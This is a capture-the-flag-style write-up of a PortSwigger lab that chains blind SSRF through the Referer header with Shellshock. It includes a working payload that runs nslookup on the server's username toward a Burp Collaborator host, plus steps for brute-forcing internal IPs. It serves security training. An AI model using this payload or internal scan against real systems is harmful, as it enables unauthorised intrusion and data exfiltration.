# Blind SSRF - with Shellshock exploitation

## 📌 Lab Details
- **Title**: Blind SSRF with Shellshock exploitation
- **Difficulty**: Expert
- **Category**: Server-side Request Forgery
- **Lab URL**: https://portswigger.net/academy/labs/launch/d453c6b39efc515eb918548d6ff29ddde86d0d0361ab5453b626309de0e3a958?referrer=%2fweb-security%2fssrf%2fblind%2flab-shellshock-exploitation

## 🔍 Summary
This lab demonstrates a **Blind SSRF** vulnerability combined with Shellshock exploitation. The application uses **analytics software** that fetches the URL specified in the `Referer` header when a product page is loaded. This behavior allows an attacker to trigger **SSRF** by injecting internal IPs into the Referer.

## 🛠 Steps to Solve
1. Intercept the request to the **product** page in Burp Suite.
2. Send the request to the **Burp Intruder**.
3. Insert the following **Shellshock** payload in the `User-Agent` value:
   ```sh
   () { :; } /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
   ```
4. Change the `Referer` header to `http://192.168.0.X:8080`. Then highlight the final octet of the IP address, click Add `§`.
5. Change the **Payload** type to numbers range from 1 to 255 with a step size of 1.
6. When the attack is finished, go to the **Collaborator** tab and click **Poll Now**.
7. You should see a **DNS** interaction that was initiated by the back-end system. Now enter the name of the **OS** user to complete the lab.

## 📖 Key Takeaways
- Blind SSRF can be exploited using headers like `Referer` if the server performs backend requests.
- Shellshock vulnerabilities can be triggered via crafted `User-Agent` headers.
- DNS-based out-of-band channels (Burp Collaborator) are useful for exfiltrating data in blind attacks.
- Brute-forcing IP ranges is effective when targeting internal networks with SSRF.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1056880d-48b7-4fa5-927c-537952dd3d7b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fbe3008f-6cd3-4626-98a3-67d3e3a85bb9" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/51827f44-d8c8-4b65-a176-30a5769bc027" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3da0f785-935c-40f7-a062-655ad378000d" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6489063c-8d85-40c3-b431-9b6e008e54ac" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9b8f72dd-2e80-4c2f-8ede-3db0abf80845" />
